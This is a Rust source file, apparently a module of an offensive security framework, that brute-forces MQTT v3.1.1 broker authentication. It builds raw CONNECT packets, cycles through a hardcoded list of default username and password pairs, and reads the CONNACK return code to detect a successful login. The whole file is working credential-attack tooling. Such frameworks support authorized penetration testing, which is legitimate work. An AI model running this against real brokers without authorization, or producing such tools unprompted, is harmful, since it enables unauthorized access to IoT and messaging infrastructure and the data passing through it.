//! MQTT v3.1.1 CONNECT credential probe.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 1883;

const DEFAULTS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "public"),
    ("mqtt", "mqtt"),
    ("guest", "guest"),
    ("user", "user"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "MQTT Bruteforce".to_string(),
        description:
            "Tests MQTT v3.1.1 CONNECT authentication. Reads CONNACK return code to classify \
             accepted / bad-credentials / not-authorized. Single-target — scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Normal,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("mqtt_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "mqtt",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/mqtt_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass| async move { probe(&host, port, &user, &pass).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str) -> LoginResult {
    use tokio::io::AsyncWriteExt;

    let timeout = Duration::from_secs(5);
    let addr = format!("{}:{}", host, port);
    let mut stream = match crate::utils::creds_helper::connect_with_timeout(&addr, timeout).await {
        Ok(s) => s,
        Err(e) => {
            return LoginResult::Error {
                message: format!("connect: {e}"),
                retryable: true,
            }
        }
    };

    // CONNECT — variable header + payload.
    // Variable header: protocol name "MQTT" (2-byte len + bytes), level=4,
    // flags(0xc2 = username+password, clean session), keep-alive=60.
    let client_id = format!("rs-{}", rand::random::<u32>());
    let mut payload = Vec::new();
    push_str(&mut payload, &client_id);
    push_str(&mut payload, user);
    push_str(&mut payload, pass);

    let mut variable = Vec::new();
    push_str(&mut variable, "MQTT");
    variable.push(4); // protocol level
    variable.push(0xc2); // username + password + clean session
    variable.extend_from_slice(&60u16.to_be_bytes()); // keep alive

    let mut packet = Vec::new();
    packet.push(0x10); // CONNECT
    let remaining_len = variable.len() + payload.len();
    encode_remaining_length(&mut packet, remaining_len);
    packet.extend_from_slice(&variable);
    packet.extend_from_slice(&payload);

    if let Err(e) = stream.write_all(&packet).await {
        return LoginResult::Error {
            message: format!("write CONNECT: {e}"),
            retryable: true,
        };
    }

    // Read CONNACK fixed header (1 byte) + remaining length (1 byte) +
    // session-present (1) + return code (1).
    let mut buf = [0u8; 4];
    if let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
        &mut stream,
        &mut buf,
        timeout,
    )
    .await
    {
        return LoginResult::Error {
            message: format!("read CONNACK: {e}"),
            retryable: true,
        };
    }
    if buf[0] != 0x20 {
        return LoginResult::Error {
            message: format!("not a CONNACK (type 0x{:02x})", buf[0]),
            retryable: false,
        };
    }
    match buf[3] {
        0 => LoginResult::Success,
        4 | 5 => LoginResult::AuthFailed, // bad credentials / not authorized
        other => LoginResult::Error {
            message: format!("CONNACK return code {other}"),
            retryable: false,
        },
    }
}

fn push_str(buf: &mut Vec<u8>, s: &str) {
    let bytes = s.as_bytes();
    let len = bytes.len() as u16;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(bytes);
}

fn encode_remaining_length(buf: &mut Vec<u8>, mut value: usize) {
    loop {
        let mut byte = (value & 0x7f) as u8;
        value >>= 7;
        if value > 0 {
            byte |= 0x80;
        }
        buf.push(byte);
        if value == 0 {
            break;
        }
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/mqtt_bruteforce", native);
